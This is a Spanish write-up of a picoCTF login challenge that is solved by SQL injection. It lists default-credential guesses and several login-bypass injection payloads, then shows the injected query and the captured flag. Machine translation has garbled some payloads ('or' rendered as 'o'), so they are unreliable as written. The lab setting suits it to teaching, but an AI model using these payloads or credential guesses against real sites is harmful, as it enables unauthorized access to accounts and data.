## Descripción
```
Can you login to this website?

Additional details will be available after launching your challenge instance.
Try to login [here](http://saturn.picoctf.net:53407/).
```
## Solución
```
 Primero tenemos la página de inicio de sesión pero no sabemos `USERNAME`y `password`.
Siempre debería probar todo esto primero:
NOMBRE DE USUARIO: admin   
CONTRASEÑA: adminNOMBRE DE USUARIO: admin   
CONTRASEÑA: password
Deberíamos intentar la inyección SQL para omitir las pantallas de inicio de sesión. Deberíamos intentar el comando de inyección SQL:
****RECOMENDADO****  
 NOMBRE DE USUARIO: ' o 1=1--   
CONTRASEÑA: ' o 1=1--****RECOMENDADO****  
 NOMBRE DE USUARIO: ' o 1=1/*   
CONTRASEÑA: ' o 1=1/*NOMBRE DE USUARIO: ' o ' 1=1   
CONTRASEÑA: ' o ' 1=1NOMBRE DE USUARIO: admin' o 1=1 -- -   
CONTRASEÑA: admin' o 1=1 -- -NOMBRE DE USUARIO: admi'||'n'||substr(   
CONTRASEÑA : ,0,0)||'NOMBRE DE USUARIO: admi'||(nullif('n',   
CONTRASEÑA: ))||'

Vamos a comprobarlo `View page source`(haga clic derecho en la página), y así obtendremos la bandera en: 
|   |
|---|
|<pre>username: admi&#039;\|(nullif(&#039;n&#039;,|
||password: ))\|&#039;|
||SQL query: SELECT * FROM users WHERE name=&#039;admi&#039;\|(nullif(&#039;n&#039;, &#039; AND password=&#039;))\|&#039;&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>|

picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}
```

## Notas 
```
**¿Qué es la inyección SQL?** La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Por lo general, permite que un atacante vea datos que normalmente no puede recuperar. Esto puede incluir datos que pertenecen a otros usuarios o cualquier otro dato al que la propia aplicación pueda acceder. En muchos casos, un atacante puede modificar o eliminar estos datos, lo que provoca cambios persistentes en el contenido o el comportamiento de la aplicación.

En algunas situaciones, un atacante puede escalar un ataque de inyección SQL para comprometer el servidor subyacente u otra infraestructura de back-end, o realizar un ataque de denegación de servicio.
```

## Referencias
````

```
